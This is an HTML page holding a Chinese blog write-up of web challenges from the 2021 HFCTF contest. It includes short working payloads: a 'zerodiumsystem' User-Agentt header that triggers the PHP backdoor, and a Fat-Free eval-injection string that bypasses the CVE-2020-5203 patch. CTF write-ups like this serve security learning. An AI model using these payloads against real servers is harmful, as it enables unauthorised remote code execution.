<!DOCTYPE html>
<html lang="zh-CN,en,default">
  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <link rel="preload" href="/css/first.css" as="style">
  

  <!-- 页面元数据 -->
  
  <title>2021HFCTF Web Writeup - TARI TARI</title>
  
    <meta name="keywords" content="ctf,ctf比赛">
  

  

  <!-- feed -->
  

  <!-- import meta -->
  

  <!-- link -->
  
    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
  

  <!-- import link -->
  

  
    
<link rel="stylesheet" href="/css/first.css">

  

  
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  

  <script id="loadcss"></script>

  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
	</style>
    <div class="kill-noscript">
        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
    </div>
</noscript>

</head>

  <body>
    

<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
            TARI TARI
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-home fa-fw'></i>主页
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="搜索..." />
        </form>
      </div>

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-home fa-fw'></i>主页
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
        <div id="full" class='cover-wrapper post dock' style="display: none;">
          
            <div class='cover-bg lazyload placeholder' data-bg="/img/home.jpeg"></div>
          
          <div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">TARI TARI</p>
    
    
      <p class="subtitle">记录信安路上的点滴 (:</p>
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
      </div>
    </div>
  </div>
</div>

          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
        </div>
    
  
  </div>

      <div id="safearea">
        <div class="body-wrapper" id="pjax-container">
          

<div class='l_main'>
  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
  


  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title">
        2021HFCTF Web Writeup
      </h1>
      <div class='new-meta-box'>
        
          
            <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：2021年4月3日 17:47</p>
  </a>
</div>

          
        
          
            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-02-01T12:24:17+08:00">
  <a class='notlink'>
    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
    <p>更新于：2022年2月1日 12:24</p>
  </a>
</div>

          
        
          
            
  <div class="new-meta-item browse leancloud">
    <a class='notlink'>
      
      <div id="lc-pv" data-title="2021HFCTF Web Writeup" data-path="/p/2021/2021hfctf/">
        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
        次浏览
      </div>
    </a>
  </div>


          
        
          
            
  <div class="new-meta-item wordcount">
    <a class='notlink'>
      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
      <p>字数：6.6k字</p>
    </a>
  </div>
  <div class="new-meta-item readtime">
    <a class='notlink'>
      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
      <p>时长：31分钟</p>
    </a>
  </div>


          
        
      </div>
    
  </div>


  
  
  <p>internal_system 挺有意思的，复现完学到了刷多 （</p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>考点：PHP供应链攻击</p>
<p>php 近期爆的漏洞，一开始就看到了，</p>
<p><img src="/img/2021hfctf/image-20210403190259626.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190259626.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190259626"></p>
<p>喔？你说这个我可就不困了，（我是个爱看新闻的好孩子 逃</p>
<img src="/img/2021hfctf/image-20210403175010155.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175010155.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175010155" style="zoom:50%;" />

<p>但是，，User-Agentt 看成了 User-Agent，，没成，然后被另一个地方吸住了眼球，在搞 guestbook.php 草。。</p>
<p>直到官方放出提示，我不信邪在看了一遍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agentt: zerodiumsystem(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>



<p><img src="/img/2021hfctf/image-20210403175138664.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175138664.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175138664"></p>
<h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>考点：CVE-2020-5203 补丁绕过</p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"><span class="comment">// $f3 = Base::instance();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure>



<p>也是有故事</p>
<p><img src="/img/2021hfctf/image-20210403175307159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175307159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175307159"></p>
<p>开开心心本地分析了一波弄出来了，线上一打，啥返回都没= =，，我在想..</p>
<p>你这不是考察 CVE-2020-5203 根据 3.7.2的代码修改记录 <a target="_blank" rel="noopener" href="https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829">https://github.com/bcosca/fatfree-core/commit/dae95a0baf3963a9ef87c17cee52f78f77e21829</a> 来写 3.7.1 的exp么？</p>
<p>你不是。。3.7.2 吧？晕，于是想办法找，找到了 changlog 来确定版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib/CHANGELOG.md</span><br></pre></td></tr></table></figure>

<p><img src="/img/2021hfctf/image-20210403194520727.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403194520727.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403194520727"></p>
<p>草，慢慢分析吧，其实漏洞触发点是类似的</p>
<p><img src="/img/2021hfctf/image-20210403175851985.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175851985.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175851985"></p>
<p><img src="/img/2021hfctf/image-20210403175931732.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403175931732.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403175931732"></p>
<p>由上两图，<code>$f3</code> 是 <code>Base</code> 实例，这个类重载了 <code>__unset</code> 魔术方法，然后这个 <code>$key</code> 参数是可控的</p>
<p><img src="/img/2021hfctf/image-20210403180041983.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180041983.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180041983"></p>
<p>也就是说，调用 <code>unset($f3-&gt;$a);</code> 会触发该魔术方法，跟进 <code>$this-&gt;offsetunset</code> 方法，调用 <code>$this-&gt;clear</code> 方法</p>
<p><img src="/img/2021hfctf/image-20210403180152159.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180152159.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180152159"></p>
<p>继续跟进，</p>
<p><img src="/img/2021hfctf/image-20210403180437548.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180437548.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180437548"></p>
<p>刚刚说到，这个 <code>$key</code> 参数是可控的，也就是说，这个 <code>eval</code> 里的 <code>$val</code> 是可控的</p>
<p><img src="/img/2021hfctf/image-20210403180630972.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403180630972.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403180630972"></p>
<p>问题是，3.7.2 版本打过补丁， <code>$this-&gt;compile</code>  方法和之前的不同，如果用 3.7.1 版本的exp 打，断点调试，会发现最终 <code>$val</code> 构造出来是类似于 <code>&quot;[&#39;xxx;eval_code&#39;]&quot;</code> ，无论怎样都会被包括在引号里的。</p>
<p>先传入 <code>/?a=s</code></p>
<p><img src="/img/2021hfctf/image-20210403183838570.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403183838570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403183838570"></p>
<p>右边红框框住的部分和原本有点不一样，就是把写在一起的提取出来，赋值到变量里方便查看变化</p>
<p>经过 <code>$this-&gt;compile</code> 预处理值 <code>$pre</code> 为 <code>$hive[&#39;s&#39;]</code> ，</p>
<p>要后被 <code>eval</code> 的部分 <code>$pinjie</code> 为 <code>&quot;unset($this-&gt;hive[&#39;s&#39;]);&quot;</code> 。</p>
<p>到这里我们明白了大概的数据流，即设法构造 <code>$_GET[&#39;a&#39;]</code> 使我们的恶意代码可以被 <code>eval</code></p>
<p>这里绕过有两个点</p>
<ul>
<li>数组闭合</li>
<li>注释闭合多余部分</li>
</ul>
<p>继续尝试构造传入 <code>a=s[]);</code></p>
<p><img src="/img/2021hfctf/image-20210403184354702.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403184354702.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403184354702"></p>
<p>可以看到 <code>$pre</code> 部分已经成功被闭合了，但是有个问题，</p>
<p> <code>$pinjie</code> 部分拼接不正常</p>
<p><code>unset($this-&gt;hive[&#39;s&#39;][&#39;&#39;]);</code> 这部分正常，但多了 <code>);</code></p>
<div class="note quote"><p>至于为什么我这么熟练，直接用数组给闭合了，，因为一开始，，在分析 3.7.1 时，把代码流，包括 <code>$this-&gt;compile</code> 部分给整明白了，然后 3.7.2 重构了 <code>$this-&gt;compile</code> 很类似，有兴趣可以去看看，就是正则有点多和复杂。。。看的头皮发麻</p></div>



<p>尝试传入 <code>a=s[]);phpinfo();//</code> 这样，反正后面多了的 <code>);</code> 会被注释掉（好像和我新年出的 CTF 有点像，要闭合加注释），断点看看呗</p>
<p><img src="/img/2021hfctf/image-20210403185337497.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185337497.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185337497"></p>
<p><img src="/img/2021hfctf/image-20210403185407122.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185407122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185407122"></p>
<p>然后线上环境 cat 一下就好了</p>
<p><img src="/img/2021hfctf/image-20210403185505318.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403185505318.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403185505318"></p>
<h2 id="“慢慢做”-管理系统"><a href="#“慢慢做”-管理系统" class="headerlink" title="“慢慢做” 管理系统"></a>“慢慢做” 管理系统</h2><p>没做出来，写思路，后续补上</p>
<p>提示</p>
<blockquote>
<p>第一步登录的sql语句是”SELECT * FROM users WHERE password = ‘“.md5($password,true).”‘ limit 0,1”;</p>
</blockquote>
<p>元老级 <code>md5($password,true)</code> 绕过，以前实验吧刷过，可以看以下链接</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p>
<p>但是。。黑人问号.jpg </p>
<p><img src="/img/2021hfctf/image-20210403190124297.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190124297.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190124297"></p>
<p>好，你说题目描述重要</p>
<blockquote>
<p><strong>这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag，反正慢慢做就对了，不要急躁，静下心。</strong></p>
</blockquote>
<p>完全不知道 ssrf 的点在哪，一共就发现 index.php admin.php 和 flag.php 三个文件，好了，没思路了。（还是太菜了</p>
<p>emm，看来别人的wp，发现原来，，除了 ffifdyop 还有其他的，晕….</p>
<p>坐等 buu 出复现 （</p>
<p>5月6更</p>
<hr>
<p>buu 群问了下，说不会出复现环境了，参考其他师傅的题解吧~</p>
<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6885.html#WEB1">https://www.zhaoj.in/read-6885.html#WEB1</a></p>
<h2 id="internal-system"><a href="#internal-system" class="headerlink" title="internal_system"></a>internal_system</h2><p>没做出来，但是感觉接近了</p>
<p>admin/admin 一把梭，</p>
<p><img src="/img/2021hfctf/image-20210403190428006.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210403190428006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210403190428006"></p>
<p>密码竟然是错的，不过有提示</p>
<p>访问 <code>/source</code> 获取源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> router = express.Router()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isIp = <span class="built_in">require</span>(<span class="string">&#x27;is-ip&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> IP = <span class="built_in">require</span>(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> UrlParse = <span class="built_in">require</span>(<span class="string">&#x27;url-parse&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;sha256, hint&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> salt = <span class="string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> adminHash = sha256(sha256(salt + <span class="string">&#x27;admin&#x27;</span>) + sha256(salt + <span class="string">&#x27;admin&#x27;</span>))</span><br><span 